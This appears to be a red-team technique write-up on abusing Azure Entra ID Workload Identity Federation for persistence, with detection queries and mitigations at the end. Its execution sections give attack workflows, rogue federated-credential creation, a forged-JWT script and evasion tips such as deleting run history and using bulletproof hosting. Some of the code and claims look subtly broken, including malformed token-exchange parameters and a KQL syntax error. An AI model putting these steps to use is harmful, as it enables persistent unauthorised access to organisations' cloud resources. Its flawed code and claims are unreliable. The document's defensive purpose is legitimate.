# [PERSIST-VALID-005]: Workload Identity Federation Abuse for Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-VALID-005 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Entra ID (Microsoft Azure) |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure/Entra ID versions (cloud-native) |
| **Patched In** | N/A (Requires mitigation configuration) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Workload Identity Federation (WIF) is a Microsoft Entra ID feature that allows external workloads (GitHub Actions, Azure DevOps, Kubernetes, on-premises systems) to authenticate and access Azure resources using short-lived OIDC (OpenID Connect) tokens, eliminating the need for long-lived secrets. However, attackers can abuse misconfigured WIF to establish persistent access by creating federated credentials with overly permissive trust policies, poisoning attribute mappings, or exploiting trust relationships between identity providers and service accounts.

**Attack Surface:** The attack surface includes:
- Federated credentials on service principals or user-assigned managed identities
- Trust relationships between external identity providers (GitHub, Azure DevOps, Kubernetes OIDC issuers)
- Attribute mappings that lack proper claim validation (e.g., `sub`, `aud`, `repository`, `ref` claims)
- Overly permissive IAM role assignments on federated identities
- OIDC issuer metadata endpoints not secured against man-in-the-middle attacks

**Business Impact:** **An attacker who gains access to federated credential configuration can establish persistent, long-lived access to Azure resources without needing to rotate secrets or re-authenticate.** This enables attackers to bypass conditional access policies, evade MFA enforcement, maintain access across credential rotations, and escalate privileges from external workloads to Azure resources. The attack can remain undetected because WIF is designed to minimize audit log noise compared to traditional authentication.

**Technical Context:** WIF token exchanges typically complete in 1-3 seconds and generate minimal audit events (only the final token acquisition is logged, not the OIDC validation). Detection difficulty is **Medium** – while the attack can be detected via anomalous federated credential creation or unusual attribute mappings, blue teams often miss WIF abuse because they focus on user and service principal activity rather than infrastructure-level identity configuration changes.

### Operational Risk

- **Execution Risk:** **Medium** – Creating federated credentials requires role-based access control (RBAC) permissions (`Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write` or equivalent for app registrations), but misconfigured admin consent workflows often grant these permissions to overly broad roles.
- **Stealth:** **High** – WIF authentication generates minimal audit events and blends in with legitimate CI/CD token exchanges. An attacker can establish persistence without triggering alert rules focused on failed logins or MFA denials.
- **Reversibility:** **No** – Once a federated credential is created with a malicious attribute mapping or trust relationship, an attacker maintains access until the credential is explicitly deleted. Even if secrets are rotated, the WIF credential persists.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.2.2 (Azure AD) | Ensure that only cloud applications are allowed to authenticate directly to Azure AD. Workload Identity Federation misconfiguration allows external identities to authenticate without proper validation. |
| **DISA STIG** | V-222548 (Azure) | Multi-factor authentication must be enforced. WIF with permissive attribute mappings bypasses MFA by design (tokens are pre-authenticated by external IdP). |
| **CISA SCuBA** | Identity, Credential, and Access Management (ICAM) | Strict attribute validation and least privilege must be enforced on all identity sources, including federated workloads. |
| **NIST 800-53** | AC-3 (Access Enforcement), IA-5 (Authentication) | Implement role-based access control and validate all external identity claims before granting access. |
| **GDPR** | Art. 32 (Security of Processing) | Organizations must ensure identity controls and audit trails for all system access, including federated identity exchanges. |
| **DORA** | Art. 9 (ICT Incident Reporting) | Critical identity misconfigurations must be logged and monitored as part of ICT security incident detection. |
| **NIS2** | Art. 21 (Cybersecurity Risk Management Measures) | Identity management systems must include continuous monitoring and validation of all authentication pathways, including workload identities. |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights) | Workload identity credentials must be managed with the same rigor as user credentials, with role-based access control and audit trails. |
| **ISO 27005** | Risk Assessment - "Compromise of Workload Identity Credentials" | Federated credential misconfigurations represent a high-likelihood, high-impact risk scenario. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- To abuse WIF for persistence, an attacker must first compromise an account or service principal with one of:
  - **`Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write`** (to create WIF credentials on managed identities)
  - **`Application.ReadWrite.All`** (to modify app registration federated credentials)
  - **`Directory.ReadWrite.All`** (to modify any identity in the tenant)
  - OR compromise an external identity provider (GitHub, Azure DevOps, Kubernetes OIDC issuer) trusted by the organization

**Required Access:**
- Network access to Entra ID / Microsoft identity platform (`https://login.microsoftonline.com`)
- Access to the external OIDC identity provider (GitHub account, Azure DevOps organization, Kubernetes cluster)
- (Optional) Access to the target service principal's configuration in Azure Portal or MS Graph API

**Supported Versions:**
- **Entra ID:** All versions (cloud-native service)
- **External OIDC Issuers:** GitHub (token.actions.githubusercontent.com), Azure DevOps (vstoken.dev.azure.com), Kubernetes (any OIDC-compliant issuer), Google Cloud (iam.googleapis.com), AWS (via cognito-idp)

**Tools:**
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (v2.x+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (v2.50.0+)
- [AADInternals](https://o365blog.com/aadinternals/) (PowerShell module for Entra ID enumeration)
- [ROADTools](https://github.com/dirkjanm/ROADtools) (Azure AD enumeration toolkit)
- **curl** or **Invoke-WebRequest** (for manual OIDC token inspection)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Existing Federated Credentials

**Objective:** Identify which managed identities or app registrations already have federated credentials configured.

**Command (PowerShell via Microsoft Graph):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "ManagedIdentity.Read.All"

# List all user-assigned managed identities with federated credentials
$identities = Get-MgIdentityUserAssignedIdentity

foreach ($identity in $identities) {
    $fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $identity.Id
    if ($fedCreds) {
        Write-Host "Managed Identity: $($identity.Name)"
        Write-Host "  Federated Credentials: $($fedCreds.Count)"
        foreach ($cred in $fedCreds) {
            Write-Host "  - Issuer: $($cred.Issuer)"
            Write-Host "    Subject: $($cred.Subject)"
            Write-Host "    Audiences: $($cred.Audiences -join ', ')"
        }
    }
}
```

**What to Look For:**
- Federated credentials pointing to external OIDC issuers (GitHub, Azure DevOps, Kubernetes)
- Credentials with broad subject claims (e.g., no repository restriction, all branches allowed)
- Credentials associated with high-privilege service accounts or managed identities with `Owner` or `Contributor` roles

**Version Note:** Behavior is consistent across all Entra ID versions. Attribute access depends on Microsoft Graph v1.0 API availability.

### Step 2: Inspect Attribute Mappings for Overpermissiveness

**Objective:** Identify if attribute mappings lack proper claim validation.

**Command (Azure CLI):**

```bash
# List app registrations and their federated credentials
az ad app list --query "[].{appId:appId, displayName:displayName}" -o json | jq '.[]'

# For a specific app, list its federated credentials
APP_ID="<application-id>"
az ad app federated-identity-credential list --id $APP_ID --query "[].{issuer:issuer, subject:subject, audiences:audiences}" -o json
```

**What to Look For:**
- Federated credentials without strict `subject` filtering (e.g., `subject: "*"` or missing `repository` claim validation)
- Credentials using broad `audiences` (e.g., audience not specific to the application)
- Credentials with `issuer` pointing to shared OIDC endpoints (e.g., `https://token.actions.githubusercontent.com` for GitHub Actions) without per-org/per-repo validation

**Command (PowerShell - Graph API):**

```powershell
# Enumerate app registrations and their federated credentials
$apps = Get-MgApplication -All

foreach ($app in $apps) {
    try {
        $fedCreds = Get-MgApplicationFederatedIdentityCredential -ApplicationId $app.Id -ErrorAction SilentlyContinue
        if ($fedCreds) {
            Write-Host "App: $($app.DisplayName) ($($app.AppId))"
            foreach ($cred in $fedCreds) {
                Write-Host "  Issuer: $($cred.Issuer)"
                Write-Host "  Subject: $($cred.Subject)"
                Write-Host "  Audiences: $($cred.Audiences -join ', ')"
            }
        }
    } catch { }
}
```

### Step 3: Verify External Identity Provider Trust Relationships

**Objective:** Confirm which external identity providers are trusted by the organization.

**Command (PowerShell - AADInternals):**

```powershell
Import-Module AADInternals

# Get federated domain information
Get-AADIntFederatedDomain | Select-Object DomainName, IssuerUri, FederationBrandingDisplayName
```

**What to Look For:**
- Federated domains with ADFS, Okta, Ping Identity, or custom OIDC endpoints
- Trust relationships that lack multi-factor authentication enforcement (`federatedIdpMfaBehavior` set to `acceptIfMfaByExternalIdpIsNotAvailable` or `ignoreMfaByExternalIdp`)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Abusing Existing Federated Credential Configuration (GitHub Actions)

**Supported Versions:** All Entra ID versions

**Prerequisite:** Attacker has compromised or controls a GitHub Actions repository, OR has write access to an existing GitHub organization whose OIDC issuer is already trusted.

#### Step 1: Enumerate Trusted GitHub Federated Credentials

**Objective:** Identify managed identities or app registrations that trust GitHub Actions OIDC issuer.

**Command:**

```powershell
# Find all managed identities trusting GitHub Actions
$identities = Get-MgIdentityUserAssignedIdentity -All

foreach ($identity in $identities) {
    $fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $identity.Id
    
    foreach ($cred in $fedCreds) {
        if ($cred.Issuer -eq "https://token.actions.githubusercontent.com") {
            Write-Host "Found GitHub-trusted identity: $($identity.Name)"
            Write-Host "  Subject: $($cred.Subject)"
            Write-Host "  Audience: $($cred.Audiences -join ', ')"
            
            # Check what roles this identity has
            $roles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $identity.Id
            Write-Host "  Assigned Roles: $($roles | Select-Object -ExpandProperty AppRoleId | Join-String -Separator ', ')"
        }
    }
}
```

**What This Means:**
- If output shows `Subject: repo:attacker-org/attacker-repo:ref:refs/heads/main`, the attacker can mint tokens from that GitHub Actions workflow.
- If `Audience` is not specific to the target resource (e.g., only contains resource URI, not repo-specific claim), the attacker can reuse tokens for privilege escalation.

#### Step 2: Create Rogue GitHub Workflow to Mint OIDC Tokens

**Objective:** Use a compromised or attacker-controlled GitHub Actions workflow to request and use an OIDC token for Azure access.

**Malicious GitHub Actions Workflow (.github/workflows/malicious.yml):**

```yaml
name: Malicious Azure Access
on: [push]

jobs:
  authenticate:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - name: Authenticate to Azure using WIF
        run: |
          # Request an OIDC token from GitHub
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.token')
          
          # Exchange OIDC token for Azure access token
          ACCESS_TOKEN=$(curl -s -X POST \
            "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
            -d "grant_type=client_credentials" \
            -d "client_id=<MANAGED_IDENTITY_CLIENT_ID>" \
            -d "assertion=$OIDC_TOKEN" \
            -d "requested_token_use=on_behalf_of" \
            -H "Content-Type: application/x-www-form-urlencoded" | jq -r '.access_token')
          
          # Use the access token to perform privileged operations
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://graph.microsoft.com/v1.0/me" | jq '.'
```

**Expected Output:**
- If the federated credential is properly configured, the token exchange succeeds.
- The attacker can then use the `ACCESS_TOKEN` to call Microsoft Graph or Azure Management APIs.

**OpSec & Evasion:**
- Delete the workflow run history to hide evidence: `gh run delete <run-id>`
- Use a private GitHub repository to reduce visibility.
- Stagger token acquisition across multiple runs to avoid detection of bulk access patterns.
- The OIDC token exchange generates minimal logs—only the final API call (e.g., accessing Microsoft Graph) is logged in Azure audit logs.

**Troubleshooting:**
- **Error:** `invalid_grant` or `AADSTS65001`
  - **Cause:** The OIDC token issuer or subject claim doesn't match the federated credential configuration.
  - **Fix:** Verify the `Subject` field in the federated credential matches GitHub's token format: `repo:<org>/<repo>:ref:refs/heads/<branch>` or `repo:<org>/<repo>:environment:<env>`

#### Step 3: Establish Persistence via Additional Federated Credentials

**Objective:** Once token access is achieved, create additional federated credentials that don't depend on the original GitHub Actions workflow.

**Command (PowerShell):**

```powershell
# This assumes the attacker has obtained an access token with admin rights

$managedIdentityId = "<target-identity-id>"
$newFederatedCred = @{
    name = "AttackerEscapeRoute"
    issuer = "https://token.actions.githubusercontent.com"
    subject = "repo:attacker-controlled-org/attacker-repo:ref:refs/heads/main"
    audiences = @("api://AzureADTokenExchange")
}

# Create the new federated credential
New-MgIdentityUserAssignedIdentityFederatedIdentityCredential `
    -UserAssignedIdentityId $managedIdentityId `
    -BodyParameter $newFederatedCred
```

**What This Means:**
- The attacker has now ensured persistence even if the original GitHub workflow or repository access is revoked.
- The new credential can be accessed from any GitHub Actions workflow the attacker controls.

---

### METHOD 2: Poisoning Attribute Mappings on Service Principals

**Supported Versions:** All Entra ID versions

**Prerequisite:** Attacker has compromised a service principal with `Application.ReadWrite.All` permission.

#### Step 1: Identify High-Privilege Service Principals

**Objective:** Find service principals with overly permissive roles.

**Command (PowerShell):**

```powershell
# Get all service principals and their role assignments
$spList = Get-MgServicePrincipal -All -PageSize 999

foreach ($sp in $spList) {
    $roles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
    
    foreach ($role in $roles) {
        # Check for high-privilege roles
        if ($role.AppRoleId -match "(9e3f62cf-ca93-4989-b6ce-5f6e88c70d57|9adb8b1e-78ff-4034-96ad-6e42fd69ae4d|62e90394-69f5-4237-9190-012177145e10)") {
            Write-Host "High-privilege service principal: $($sp.DisplayName)"
            Write-Host "  Object ID: $($sp.Id)"
            Write-Host "  Role: $($role.AppRoleId)"
        }
    }
}
```

**What to Look For:**
- Service principals with `Application.ReadWrite.All`, `Directory.ReadWrite.All`, or `RoleManagement.ReadWrite.Directory` roles.

#### Step 2: Modify Federated Credential Attribute Mappings

**Objective:** Alter the attribute mapping to accept tokens from external identity providers the attacker controls.

**Command (PowerShell):**

```powershell
$spId = "<service-principal-id>"

# Create a new federated credential with overly permissive attribute mapping
$federatedCred = @{
    name = "PermissiveFederation"
    issuer = "https://attacker-oidc-server.com"  # Attacker-controlled OIDC issuer
    subject = "*"  # Accept ANY subject claim (critical vulnerability!)
    audiences = @("https://management.azure.com")
}

# Add the federated credential to the app registration
New-MgApplicationFederatedIdentityCredential `
    -ApplicationId (Get-MgServicePrincipal -Filter "id eq '$spId'").AppId `
    -BodyParameter $federatedCred
```

**What This Means:**
- The `subject = "*"` mapping allows ANY token from the attacker's OIDC server to be accepted.
- The attacker can now mint arbitrary tokens and exchange them for Azure access tokens.

#### Step 3: Mint Custom OIDC Tokens from Attacker's IdP

**Objective:** Create tokens that match the poisoned attribute mapping.

**Command (Bash - using attacker's OIDC server):**

```bash
# Generate a private key (if not already available)
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# Create a JWT token with arbitrary claims
cat > create_token.py << 'EOF'
import jwt
import json
from datetime import datetime, timedelta
import sys

private_key = open('private_key.pem', 'r').read()

payload = {
    "iss": "https://attacker-oidc-server.com",
    "sub": "attacker@malicious.com",
    "aud": "https://management.azure.com",
    "exp": datetime.utcnow() + timedelta(hours=1),
    "iat": datetime.utcnow(),
    "nbf": datetime.utcnow(),
}

token = jwt.encode(payload, private_key, algorithm="RS256")
print(token)
EOF

python3 create_token.py
```

**Expected Output:**
- A JWT token that, when validated against the attacker's OIDC metadata endpoint, will be accepted by Entra ID.

#### Step 4: Exchange Token for Azure Access Token

**Objective:** Use the forged token to obtain an Azure access token.

**Command (Bash):**

```bash
OIDC_TOKEN="<forged-jwt-from-step-3>"
CLIENT_ID="<service-principal-client-id>"
TENANT_ID="<azure-tenant-id>"

curl -X POST \
  "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CLIENT_ID" \
  -d "assertion=$OIDC_TOKEN" \
  -d "requested_token_use=on_behalf_of" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**OpSec & Evasion:**
- Host the OIDC server on a bulletproof hoster or behind a compromised CDN to avoid direct attribution.
- The OIDC metadata endpoint is only accessed once per key rotation cycle (typically monthly), reducing detection windows.

**Troubleshooting:**
- **Error:** `invalid_grant` or `AADSTS50058` (token validation failed)
  - **Cause:** The OIDC metadata endpoint (`.well-known/openid-configuration`) wasn't properly configured or JWK signature validation failed.
  - **Fix:** Ensure the attacker's OIDC server responds with valid JWKS endpoint containing the public key corresponding to the private key used to sign the JWT.

---

### METHOD 3: Exploiting Overly Permissive Trust Relationships Between Federated IdPs

**Supported Versions:** All Entra ID versions

**Prerequisite:** Organization has Azure DevOps, GitHub, or Kubernetes integrated with Entra ID without proper subject claim validation.

#### Step 1: Enumerate All Existing Federated OIDC Issuers

**Command (PowerShell):**

```powershell
# Get all managed identities with federated credentials
$managedIds = Get-MgIdentityUserAssignedIdentity -All

$allIssuers = @()
foreach ($id in $managedIds) {
    $fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $id.Id
    foreach ($cred in $fedCreds) {
        $allIssuers += [PSCustomObject]@{
            ManagedIdentity = $id.Name
            Issuer = $cred.Issuer
            Subject = $cred.Subject
            Audiences = $cred.Audiences -join ','
        }
    }
}

$allIssuers | Group-Object Issuer | Select-Object Name, Count, @{N="Details"; E={$_.Group}}
```

**What to Look For:**
- Multiple service accounts trusting the same OIDC issuer but with different subject claims.
- If one subject is compromised (e.g., GitHub Actions repo), the attacker may escalate to other service accounts trusting the same issuer.

#### Step 2: Escalate from Compromised External Identity to High-Privilege Azure Service

**Scenario:** Attacker compromises a GitHub Actions workflow with access to a low-privilege managed identity. The organization also has a higher-privilege managed identity trusting the same GitHub OIDC issuer.

**Attacker's Plan:**
1. Use the compromised low-privilege GitHub workflow to enumerate other federated credentials.
2. Identify the high-privilege managed identity trusting the same GitHub issuer.
3. Modify the subject claim validation in the high-privilege credential to accept the attacker's repository.

**Command (PowerShell):**

```powershell
$lowPrivManagedIdId = "<compromised-low-privilege-id>"
$highPrivManagedIdId = "<target-high-privilege-id>"

# Get the federated credential from the low-privilege identity
$lowPrivCred = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $lowPrivManagedIdId

# Check if the issuer is GitHub
if ($lowPrivCred.Issuer -eq "https://token.actions.githubusercontent.com") {
    # Get high-privilege identity's credentials
    $highPrivCred = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $highPrivManagedIdId
    
    # If both trust GitHub, try to create a second credential on high-privilege identity
    # This would require `Microsoft.ManagedIdentity/*/federatedIdentityCredentials/write` permission
    
    $newCred = @{
        name = "EscalatedAccess"
        issuer = "https://token.actions.githubusercontent.com"
        subject = "repo:attacker-org/attacker-repo:ref:refs/heads/main"
        audiences = @("api://AzureADTokenExchange")
    }
    
    New-MgIdentityUserAssignedIdentityFederatedIdentityCredential `
        -UserAssignedIdentityId $highPrivManagedIdId `
        -BodyParameter $newCred
}
```

**OpSec & Evasion:**
- The new federated credential creation event appears as a routine infrastructure change and may not trigger alerts if organization doesn't monitor federated credential creation.
- Once created, the attacker can use their GitHub Actions workflow to obtain access tokens for the high-privilege identity.

---

## 5. ATTACK SIMULATION & VERIFICATION

### Manual Test: Federated Credential Token Exchange

**Test Environment:** Entra ID tenant with at least one user-assigned managed identity and a GitHub repository.

**Step 1: Create a Managed Identity and Federated Credential (Legitimate Configuration)**

```powershell
$resourceGroup = "rg-test"
$managedIdentityName = "mi-wif-test"

# Create managed identity
$mi = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroup -Name $managedIdentityName

# Create federated credential for GitHub
$federatedCredParams = @{
    ResourceGroupName = $resourceGroup
    ManagedIdentityName = $managedIdentityName
    Name = "github-repo"
    Issuer = "https://token.actions.githubusercontent.com"
    Subject = "repo:my-org/my-repo:ref:refs/heads/main"
    Audiences = @("api://AzureADTokenExchange")
}

New-AzFederatedIdentityCredential @federatedCredParams
```

**Step 2: Create a GitHub Actions Workflow That Uses the Federated Credential**

```yaml
name: Test WIF
on: [push]

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    env:
      AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
      AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
      AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
    
    steps:
      - name: Azure Login
        uses: azure/login@v2
        with:
          client-id: ${{ env.AZURE_CLIENT_ID }}
          tenant-id: ${{ env.AZURE_TENANT_ID }}
          subscription-id: ${{ env.AZURE_SUBSCRIPTION_ID }}
      
      - name: List Resources
        run: az resource list
```

**Expected Behavior:** The workflow successfully authenticates to Azure without using secrets.

**Step 3: Simulate Attacker Abuse**

Create a second workflow that attempts to reuse the OIDC token for unauthorized access:

```yaml
name: Malicious WIF Usage
on: [push]

jobs:
  abuse:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    
    steps:
      - name: Get OIDC Token
        id: token
        run: |
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.token')
          echo "::set-output name=token::$OIDC_TOKEN"
          echo "Token acquired (masked): $(echo $OIDC_TOKEN | cut -c1-20)..."
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Microsoft Graph PowerShell SDK

**Version:** 2.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell 5.1+)

**Installation:**

```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage:**

```powershell
# Connect with scopes
Connect-MgGraph -Scopes "ManagedIdentity.ReadWrite.All", "Application.ReadWrite.All"

# List federated credentials
$identity = Get-MgIdentityUserAssignedIdentity -UserAssignedIdentityId "<id>"
$fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $identity.Id
```

### Azure CLI

**Version:** 2.50.0+
**Supported Platforms:** Windows, macOS, Linux

**Installation:**

```bash
# macOS
brew install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Windows
# Download MSI from https://aka.ms/azurecloudshell
```

**Usage:**

```bash
az login
az identity create --name my-identity --resource-group my-rg
az identity federated-identity-credential create \
  --name github-fed \
  --identity-name my-identity \
  --resource-group my-rg \
  --issuer https://token.actions.githubusercontent.com \
  --subject repo:my-org/my-repo:ref:refs/heads/main \
  --audiences api://AzureADTokenExchange
```

### AADInternals

**Version:** 0.9.x
**Supported Platforms:** Windows PowerShell 5.1+, PowerShell Core 7+

**Installation:**

```powershell
# Download from https://o365blog.com/aadinternals/
# Or install via PS Gallery:
Install-Module -Name AADInternals -Force
```

**Usage:**

```powershell
Import-Module AADInternals

# Enumerate federated domains
Get-AADIntFederatedDomain

# Get federation configuration
Get-AADIntFederationMetadata -Domain "contoso.com"
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Federated Credential Creation on High-Privilege Service Principals

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy, ModifiedProperties
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Create federated identity credential" 
   or OperationName == "Update federated identity credential"
| extend TargetResource = TargetResources[0]
| extend ManagedIdentityName = TargetResource.displayName
| extend ModifiedPropsJson = parse_json(TargetResource.modifiedProperties)
| where ModifiedPropsJson[0].newValue contains "PermissiveFederation" 
   or ModifiedPropsJson[0].newValue contains "*" // subject = "*"
   or ModifiedPropsJson[0].newValue contains "repo:" and ModifiedPropsJson[0].newValue !contains "organization"
| project 
    TimeGenerated,
    OperationName,
    ManagedIdentityName,
    Issuer = ModifiedPropsJson[0].newValue,
    TargetResourceType = TargetResource.type,
    InitiatedBy = InitiatedBy.user.userPrincipalName,
    IPAddress = InitiatedBy.ipAddress
| sort by TimeGenerated desc
```

**What This Detects:**
- Line 4-5: Filters for federated credential creation operations.
- Line 7-9: Extracts the managed identity or service principal being modified.
- Line 11-14: Flags suspicious attributes:
  - `"PermissiveFederation"` (attacker-controlled naming)
  - `subject = "*"` (accepts any subject)
  - GitHub repo without organization restriction

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `High-Risk Federated Credential Creation`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create** → **Create**

---

### Query 2: Federated Credential Token Exchange from Untrusted OIDC Issuer

**Rule Configuration:**
- **Required Table:** AADNonInteractiveUserSignInLogs
- **Required Fields:** TokenIssuerType, AppDisplayName, UserAgent, ResourceDisplayName
- **Alert Severity:** Medium
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**

```kusto
AADNonInteractiveUserSignInLogs
| where TokenIssuerType == "SAML" or TokenIssuerType == "JWT"
| where UserAgent contains "github" or UserAgent contains "azure-pipelines" or AppDisplayName contains "Workload"
| where ResultType == 0  // Successful sign-in
| extend IssuedTokenProperties = parse_json(parse_json(AdditionalDetails).tokenProperties) IssuedByTokenIssuer = IssuedTokenProperties.issuer
| where IssuedByTokenIssuer !in ("https://token.actions.githubusercontent.com", "https://vstoken.dev.azure.com", "https://oidc.gke.io", "https://oidc.eks.amazonaws.com")
| summarize SignInCount = count() by 
    AppDisplayName, 
    IssuedByTokenIssuer, 
    UserPrincipalName, 
    IPAddress,
    TimeGenerated = bin(TimeGenerated, 5m)
| where SignInCount > 3  // Alert on more than 3 sign-ins from same issuer in 5 min
| sort by SignInCount desc
```

**What This Detects:**
- Token exchanges from OIDC issuers not in the allowlist (indicating attacker-controlled IdP).
- Rapid token acquisition patterns (more than 3 sign-ins from the same issuer in 5 minutes).

---

## 8. WINDOWS EVENT LOG MONITORING

Not applicable for Entra ID/cloud-native workload identity federation. All activity is logged in **Azure Audit Logs** and **Microsoft Sentinel**, not Windows Event Logs.

---

## 9. SYSMON DETECTION PATTERNS

Not applicable for Entra ID/cloud-native workload identity federation. Sysmon is designed for Windows endpoint detection and does not monitor cloud identity infrastructure.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Federated Identity Credential Creation

**Alert Name:** `Suspicious federated credential associated with a user-assigned managed identity`
- **Severity:** High
- **Description:** Microsoft Defender for Cloud monitors for federated credential creation with overly permissive attributes (e.g., `subject = "*"` or missing subject validation).
- **Applies To:** All subscriptions with Defender for Cloud enabled (Standard pricing tier)
- **Remediation:**
  1. Navigate to Azure Portal → Defender for Cloud → Recommendations
  2. Review the alert details and identify the managed identity
  3. Verify the federated credential's issuer and subject claims are properly scoped
  4. Delete the credential if it's not authorized: `Remove-AzFederatedIdentityCredential`

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Operation: Create federated identity credential

```powershell
# Search for federated credential creation events
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) `
  -RecordType AzureActiveDirectory `
  -Operations "Create federated identity credential", "Update federated identity credential" `
  -FreeText "subject" | Export-Csv -Path "C:\Audit\FederatedCredentials.csv" -NoTypeInformation
```

- **Operation:** Create federated identity credential, Update federated identity credential
- **Workload:** Entra ID / Azure Management
- **Details:** The AuditData JSON blob contains:
  - `properties.newValues[0]` (issuer, subject, audiences)
  - `targetResources[0].displayName` (managed identity name)
  - `initiatedBy.user.userPrincipalName` (who created it)

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left sidebar)
3. If not enabled, click **Start recording user and admin activity**
4. Allow 24-48 hours for historical logs to populate

**Manual Configuration Steps (Search Audit Logs):**

1. Go to **Audit** → **Search**
2. Set **Date range:** Last 30 days
3. Under **Activities**, enter: `Create federated identity credential`
4. Under **Users**, leave blank (to search all)
5. Click **Search**
6. Export results: **Export** → **Download all results**

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Implement Strict Subject Claim Validation on All Federated Credentials

**Objective:** Ensure each federated credential restricts the `subject` claim to a specific, minimal scope.

**Applies To Versions:** All Entra ID versions

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Managed Identities** OR **App registrations**
2. Select the managed identity or app registration
3. Go to **Federated credentials**
4. For each credential, click **Edit**
5. Verify the **Subject identifier** field:
   - ✅ **Good:** `repo:specific-org/specific-repo:ref:refs/heads/main`
   - ❌ **Bad:** `repo:specific-org/specific-repo:*` (allows all branches)
   - ❌ **Bad:** `repo:specific-org/*:*` (allows all repos in org)
   - ❌ **Bad:** `*` (allows any subject)
6. If too permissive, click **Delete** and recreate with proper scoping

**Manual Steps (PowerShell):**

```powershell
# Validate all federated credentials have proper subject scoping
$identities = Get-MgIdentityUserAssignedIdentity -All

foreach ($id in $identities) {
    $fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $id.Id
    
    foreach ($cred in $fedCreds) {
        if ($cred.Subject -eq "*" -or $cred.Subject -like "*/*:*") {
            Write-Host "⚠️  INSECURE: $($id.Name) has overly permissive subject: $($cred.Subject)"
            Write-Host "   Recommended remediation: Delete and recreate with specific subject"
        }
    }
}
```

